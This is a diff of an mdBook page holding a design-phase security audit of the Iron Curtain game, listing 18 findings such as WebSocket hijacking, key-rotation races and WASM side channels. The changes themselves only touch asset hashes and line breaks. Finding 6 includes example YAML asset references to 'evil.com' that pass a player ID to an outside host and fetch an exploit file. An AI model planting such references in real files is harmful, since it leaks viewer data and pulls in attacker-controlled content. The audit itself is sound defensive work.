@@ -36,10 +36,10 @@
             const path_to_root = "../";
             const default_light_theme = "navy";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../searchindex-c80260ed.js";
+            window.path_to_searchindex_js = "../searchindex-ebe5ef16.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../toc-9adfe301.js"></script>
+        <script src="../toc-5aa22486.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -183,7 +183,8 @@
                     <main>
                         <h2 id="security-audit-findings"><a class="header" href="#security-audit-findings">Security Audit Findings</a></h2>
 <p>Comprehensive verification of anti-cheat logic and security across the Iron Curtain design documentation. This audit cross-references <code>06-SECURITY.md</code> (56 vulnerabilities), <code>architecture/api-misuse-defense.md</code> (88 misuse vectors), <code>tracking/testing-strategy.md</code>, <code>03-NETCODE.md</code>, <code>04-MODDING.md</code>, <code>07-CROSS-ENGINE.md</code>, <code>architecture/type-safety.md</code>, <code>decisions/09b/D052-community-servers.md</code>, <code>decisions/09f/D071-external-tool-api.md</code>, and <code>decisions/09g/D058-command-console.md</code> / <code>D059-communication.md</code>.</p>
-<p><strong>Audit date:</strong> 2025-06<br><strong>Scope:</strong> Design-phase verification — no implementation code exists. Findings target design gaps, inconsistencies, missing threat coverage, and specification ambiguities.</p>
+<p><strong>Audit date:</strong> 2025-06
+<strong>Scope:</strong> Design-phase verification — no implementation code exists. Findings target design gaps, inconsistencies, missing threat coverage, and specification ambiguities.</p>
 <p><strong>Resolution status:</strong> All 18 findings <strong>CLOSED</strong> in design docs (2025-06). See cross-references below.</p>
 <hr>
 <h3 id="resolution-summary"><a class="header" href="#resolution-summary">Resolution Summary</a></h3>
@@ -232,7 +233,8 @@
 <p><strong>This audit found 18 findings</strong>: 4 high-severity, 8 medium-severity, 6 low-severity.</p>
 <hr>
 <h3 id="finding-1-nan-propagation-chain-in-anti-cheat-scoring-pipeline"><a class="header" href="#finding-1-nan-propagation-chain-in-anti-cheat-scoring-pipeline">Finding 1: NaN Propagation Chain in Anti-Cheat Scoring Pipeline</a></h3>
-<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V12, V34, V36 (06-SECURITY.md)</p>
+<p><strong>Severity: HIGH</strong>
+<strong>Affected:</strong> V12, V34, V36 (06-SECURITY.md)</p>
 <p>V34 adds NaN guards to <code>EwmaTrafficMonitor</code>, but the broader anti-cheat scoring pipeline has multiple <code>f64</code> stages without documented NaN guards:</p>
 <pre><code>PlayerBehaviorProfile (f64 fields)
   → behavioral_score (f64, 0.0–1.0)
@@ -249,7 +251,8 @@
 <p><strong>Milestone:</strong> M4 (anti-cheat infrastructure)</p>
 <hr>
 <h3 id="finding-2-icrp-local-websocket--cross-site-websocket-hijacking-cswsh"><a class="header" href="#finding-2-icrp-local-websocket--cross-site-websocket-hijacking-cswsh">Finding 2: ICRP Local WebSocket — Cross-Site WebSocket Hijacking (CSWSH)</a></h3>
-<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> D071 (09f/D071-external-tool-api.md)</p>
+<p><strong>Severity: HIGH</strong>
+<strong>Affected:</strong> D071 (09f/D071-external-tool-api.md)</p>
 <p>ICRP exposes a local JSON-RPC 2.0 WebSocket server. This opens a Cross-Site WebSocket Hijacking attack: a malicious webpage loaded in any browser can connect to <code>ws://localhost:PORT</code> and issue ICRP commands. The SHA-256 challenge auth partially mitigates this, but:</p>
 <ol>
 <li>The challenge secret must be stored locally (file or environment variable). Any local process or browser extension with filesystem read access can obtain it.</li>
@@ -267,7 +270,8 @@
 <p><strong>Milestone:</strong> M3 (ICRP ships Phase 2–3)</p>
 <hr>
 <h3 id="finding-3-v47-key-rotation--dual-signature-race-condition"><a class="header" href="#finding-3-v47-key-rotation--dual-signature-race-condition">Finding 3: V47 Key Rotation — Dual-Signature Race Condition</a></h3>
-<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V47 (06-SECURITY.md), D052 (09b/D052-community-servers.md)</p>
+<p><strong>Severity: HIGH</strong>
+<strong>Affected:</strong> V47 (06-SECURITY.md), D052 (09b/D052-community-servers.md)</p>
 <p>The <code>KeyRotation</code> struct requires signatures from both old and new keys. If the old key is compromised, the attacker possesses it. Both the legitimate user and attacker can simultaneously issue valid <code>KeyRotation</code> messages:</p>
 <ul>
 <li>Attacker: rotates old → attacker’s new key (signed by old + attacker’s new)</li>
@@ -290,14 +294,16 @@
 <p><strong>Milestone:</strong> M8 (identity key management ships Phase 5)</p>
 <hr>
 <h3 id="finding-4-v48-server-trust-model--resolved-by-tofu-canonicalization"><a class="header" href="#finding-4-v48-server-trust-model--resolved-by-tofu-canonicalization">Finding 4: V48 Server Trust Model — Resolved by TOFU Canonicalization</a></h3>
-<p><strong>Severity: HIGH</strong><br><strong>Affected:</strong> V48 (06-SECURITY.md)</p>
+<p><strong>Severity: HIGH</strong>
+<strong>Affected:</strong> V48 (06-SECURITY.md)</p>
 <p><strong>Original finding:</strong> V48 specified a CRL/OCSP certificate revocation model without defining unknown-status behavior (soft-fail vs hard-fail). This was a genuine gap.</p>
 <p><strong>Resolution:</strong> The V48 trust model has been rewritten to align with D052’s canonical TOFU + SK/RK two-key hierarchy. IC does not use a CA/CRL/OCSP infrastructure — community servers are self-sovereign with SSH/PGP-style trust-on-first-use. This eliminates the CRL unknown-status problem entirely: there is no CRL to go stale and no OCSP endpoint to become unreachable.</p>
 <p>The equivalent ambiguity in the TOFU model (“what happens when key state is ambiguous?”) is now resolved by V48’s connection policy table: key match → proceed, valid rotation chain → update and proceed, no valid chain → reject for ranked / warn for unranked / warn-only for LAN. First ranked connections require seed list or manual trust verification.</p>
 <p><strong>Milestone:</strong> M5 (identity key management ships Phase 5)</p>
 <hr>
 <h3 id="finding-5-wasm-timing-side-channel-maphack"><a class="header" href="#finding-5-wasm-timing-side-channel-maphack">Finding 5: WASM Timing Side-Channel Maphack</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V5 (06-SECURITY.md), 04-MODDING.md WASM Sandbox</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> V5 (06-SECURITY.md), 04-MODDING.md WASM Sandbox</p>
 <p>The WASM capability model prevents direct access to fogged state (<code>no get_all_units()</code>). However, a malicious WASM mod could infer fogged information via timing side channels:</p>
 <ul>
 <li><code>ic_query_units_in_range()</code> execution time correlates with the number of units in the spatial index, including fogged units (the spatial index operates on world state, not per-player visibility)</li>
@@ -314,7 +320,8 @@
 <p><strong>Milestone:</strong> M7 (WASM modding ships Phase 4–6)</p>
 <hr>
 <h3 id="finding-6-replay-viewer-external-asset-fetch-via-embedded-yaml"><a class="header" href="#finding-6-replay-viewer-external-asset-fetch-via-embedded-yaml">Finding 6: Replay Viewer External Asset Fetch via Embedded YAML</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V41 (06-SECURITY.md)</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> V41 (06-SECURITY.md)</p>
 <p>V41 restricts <code>SelfContained</code> replays to map data and rule YAML only (no Lua/WASM). However, embedded YAML rules could contain external asset references:</p>
 <pre><code class="language-yaml"># Embedded in a SelfContained replay's rules
 faction_icon: "https://evil.com/track.png?viewer={player_id}"
@@ -335,7 +342,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M4 (replay system ships Phase 2, SelfContained ships Phase 5)</p>
 <hr>
 <h3 id="finding-7-missing-spectator-delay-in-ranked-security-policy"><a class="header" href="#finding-7-missing-spectator-delay-in-ranked-security-policy">Finding 7: Missing Spectator Delay in Ranked Security Policy</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> D071, 06-SECURITY.md Competitive Integrity Summary</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> D071, 06-SECURITY.md Competitive Integrity Summary</p>
 <p>D071 mentions “ranked mode restricts to observer-with-delay” but neither <code>06-SECURITY.md</code> nor D071 specifies:</p>
 <ul>
 <li>The minimum delay value for ranked match observation</li>
@@ -353,7 +361,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M8 (ranked matchmaking ships Phase 5)</p>
 <hr>
 <h3 id="finding-8-console-script-iccmd-supply-chain-not-in-workshop-security-model"><a class="header" href="#finding-8-console-script-iccmd-supply-chain-not-in-workshop-security-model">Finding 8: Console Script <code>.iccmd</code> Supply Chain Not in Workshop Security Model</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> D058 (09g/D058-command-console.md), V18 (06-SECURITY.md)</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> D058 (09g/D058-command-console.md), V18 (06-SECURITY.md)</p>
 <p>D058 describes Workshop-shareable <code>.iccmd</code> console scripts that are lobby-visible and loadable. These scripts are executable content distributed through the Workshop, but V18’s supply chain security model (anomaly detection, author signing, quarantine) doesn’t explicitly cover <code>.iccmd</code> files.</p>
 <p>Console scripts could:</p>
 <ul>
@@ -370,7 +379,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M6 (console ships Phase 3, Workshop scripts Phase 5)</p>
 <hr>
 <h3 id="finding-9-certifiedmatchresult-integrity-when-replay-has-frame-loss"><a class="header" href="#finding-9-certifiedmatchresult-integrity-when-replay-has-frame-loss">Finding 9: CertifiedMatchResult Integrity When Replay Has Frame Loss</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V13, V45 (06-SECURITY.md)</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> V13, V45 (06-SECURITY.md)</p>
 <p><code>CertifiedMatchResult.replay_hash</code> is SHA-256 of the full replay data. V45 documents that <code>BackgroundReplayWriter</code> can lose frames during I/O spikes. If frames are lost:</p>
 <ol>
 <li>The <code>replay_hash</code> in the <code>CertifiedMatchResult</code> hashes the <strong>incomplete</strong> replay (with gap markers)</li>
@@ -387,7 +397,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M4 (replay system ships Phase 2)</p>
 <hr>
 <h3 id="finding-10-v43-wasm-network-access--raw-socket-ambiguity"><a class="header" href="#finding-10-v43-wasm-network-access--raw-socket-ambiguity">Finding 10: V43 WASM Network Access — Raw Socket Ambiguity</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V43 (06-SECURITY.md), 04-MODDING.md</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> V43 (06-SECURITY.md), 04-MODDING.md</p>
 <p>V43’s DNS rebinding mitigation assumes the host mediates all network access. But the doc doesn’t explicitly state that WASM mods <strong>cannot</strong> perform raw socket operations. The WASM capability model (<code>ModCapabilities.network</code>) defines <code>AllowList(Vec&lt;String&gt;)</code> but the host API surface for network access isn’t fully enumerated.</p>
 <p>If a WASM mod has access to a general-purpose HTTP function that accepts arbitrary URLs, the DNS pinning and IP range blocking must be in that function. But if the mod somehow obtains lower-level access (e.g., via a WASI preview2 socket capability), it could bypass the host’s network filtering entirely.</p>
 <p><strong>Recommendation:</strong></p>
@@ -399,7 +410,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M7 (WASM modding ships Phase 4)</p>
 <hr>
 <h3 id="finding-11-trustscore-computation-algorithm-unspecified"><a class="header" href="#finding-11-trustscore-computation-algorithm-unspecified">Finding 11: TrustScore Computation Algorithm Unspecified</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> V12 (06-SECURITY.md)</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> V12 (06-SECURITY.md)</p>
 <p><code>TrustScore.score</code> is <code>u16</code> (0–12000) and <code>TrustFactors</code> contains 7 <code>f64</code>/<code>u32</code>/<code>u8</code> fields, but:</p>
 <ul>
 <li>The weighting algorithm converting factors to score is not specified</li>
@@ -418,7 +430,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M8 (trust score ships Phase 5)</p>
 <hr>
 <h3 id="finding-12-lobby-host-configuration-manipulation"><a class="header" href="#finding-12-lobby-host-configuration-manipulation">Finding 12: Lobby Host Configuration Manipulation</a></h3>
-<p><strong>Severity: MEDIUM</strong><br><strong>Affected:</strong> Not covered in 06-SECURITY.md</p>
+<p><strong>Severity: MEDIUM</strong>
+<strong>Affected:</strong> Not covered in 06-SECURITY.md</p>
 <p>The security document doesn’t address malicious lobby hosts. In IC’s relay architecture, the lobby host sets game parameters (map, rules, balance preset, game speed). A malicious host could:</p>
 <ul>
 <li>Configure asymmetric starting conditions (more resources for self)</li>
@@ -437,7 +450,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M5 (lobby/matchmaking ships Phase 5)</p>
 <hr>
 <h3 id="finding-13-cross-reference-inconsistency--v15-protocollimits-field-duplication"><a class="header" href="#finding-13-cross-reference-inconsistency--v15-protocollimits-field-duplication">Finding 13: Cross-Reference Inconsistency — V15 ProtocolLimits Field Duplication</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V15, V17 (06-SECURITY.md), 03-NETCODE.md</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> V15, V17 (06-SECURITY.md), 03-NETCODE.md</p>
 <p><code>ProtocolLimits</code> is fully defined in V15 with all fields (including D059 voice/coordination limits). V17 references it but says <code>// ... fields defined in V15 above</code>. However, <code>03-NETCODE.md</code> § Order Rate Control also references <code>ProtocolLimits</code> but only links to <code>06-SECURITY.md</code> without defining which fields exist.</p>
 <p>The D059 voice limits (<code>max_voice_packets_per_second: 50</code>, <code>max_pings_per_interval: 3</code>) were added to the V15 struct definition but are not cross-referenced in D059’s own security considerations table (which lists rate limits but doesn’t reference the specific <code>ProtocolLimits</code> field names).</p>
 <p><strong>Recommendation:</strong></p>
@@ -448,7 +462,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> Documentation cleanup, no implementation change needed</p>
 <hr>
 <h3 id="finding-14-v35-simreconciler-constants--deferral-risk"><a class="header" href="#finding-14-v35-simreconciler-constants--deferral-risk">Finding 14: V35 SimReconciler Constants — Deferral Risk</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V35 (06-SECURITY.md), 07-CROSS-ENGINE.md</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> V35 (06-SECURITY.md), 07-CROSS-ENGINE.md</p>
 <p>V35 defines <code>MAX_TICKS_SINCE_SYNC = 300</code>, <code>MAX_CREDIT_DELTA = 5000</code>, health cap at 1000 — but explicitly states these are “deferred to M7” and “not part of M4 exit criteria.” This creates a risk: if cross-engine reconciliation is implemented before M7 (even experimentally), the bounds enforcement may be forgotten since it’s explicitly deferred.</p>
 <p><strong>Recommendation:</strong></p>
 <ul>
@@ -458,7 +473,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M7 (confirmed deferral, no change needed — just add implementation-time guard)</p>
 <hr>
 <h3 id="finding-15-v34-ewma-nan-guard--alpha-validation-timing"><a class="header" href="#finding-15-v34-ewma-nan-guard--alpha-validation-timing">Finding 15: V34 EWMA NaN Guard — Alpha Validation Timing</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V34 (06-SECURITY.md)</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> V34 (06-SECURITY.md)</p>
 <p>V34 says “<code>alpha</code> is validated at construction to be in <code>(0.0, 1.0)</code> exclusive.” However, the <code>EwmaTrafficMonitor</code> struct has <code>pub alpha: f64</code> — a public field that can be modified after construction, bypassing the construction-time validation.</p>
 <p><strong>Recommendation:</strong></p>
 <ul>
@@ -468,7 +484,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M4 (traffic monitor implementation)</p>
 <hr>
 <h3 id="finding-16-missing-threat--observer-mode-rng-state-leak"><a class="header" href="#finding-16-missing-threat--observer-mode-rng-state-leak">Finding 16: Missing Threat — Observer Mode RNG State Leak</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> 06-SECURITY.md, 03-NETCODE.md</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> 06-SECURITY.md, 03-NETCODE.md</p>
 <p>In lockstep mode, all clients share the same deterministic RNG state. Observers receive all orders and run the full simulation. If an observer has access to the RNG state (which they must, to run the sim), they can predict:</p>
 <ul>
 <li>Random crate spawns before they appear</li>
@@ -485,7 +502,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> No implementation change — documentation addition</p>
 <hr>
 <h3 id="finding-17-v26-win-trading--storage-cost-of-per-pair-match-history"><a class="header" href="#finding-17-v26-win-trading--storage-cost-of-per-pair-match-history">Finding 17: V26 Win-Trading — Storage Cost of Per-Pair Match History</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V26 (06-SECURITY.md)</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> V26 (06-SECURITY.md)</p>
 <p>The diminishing returns formula (<code>0.5^(n-1)</code>) requires tracking per-opponent-pair match counts within a rolling 30-day window. For a community with P players, the worst-case storage is O(P²) opponent pairs. The doc doesn’t address:</p>
 <ul>
 <li>Whether this is stored in the same SQLite database as ratings</li>
@@ -502,7 +520,8 @@ custom_sprite: "https://evil.com/exploit.shp"
 <p><strong>Milestone:</strong> M8 (ranked system ships Phase 5)</p>
 <hr>
 <h3 id="finding-18-v44-developer-mode--single-player-toggle-vs-replay-determinism"><a class="header" href="#finding-18-v44-developer-mode--single-player-toggle-vs-replay-determinism">Finding 18: V44 Developer Mode — Single-Player Toggle vs Replay Determinism</a></h3>
-<p><strong>Severity: LOW</strong><br><strong>Affected:</strong> V44 (06-SECURITY.md)</p>
+<p><strong>Severity: LOW</strong>
+<strong>Affected:</strong> V44 (06-SECURITY.md)</p>
 <p>V44 states “In single-player and replays, dev mode can be toggled freely.” But dev mode is a sim <code>Resource</code> in <code>ic-sim</code> (part of deterministic state). If a player toggles dev mode mid-game in single-player, the replay records this toggle. If someone views the replay without knowing dev mode was used, the replay’s behavior may be confusing (e.g., instant builds happening with no visible explanation).</p>
 <p>V44 also states “Replays record the dev mode flag” — but this appears to be a per-match flag, not a per-tick state. If dev mode is toggled mid-game, the per-match flag doesn’t capture the toggling pattern.</p>
 <p><strong>Recommendation:</strong></p>
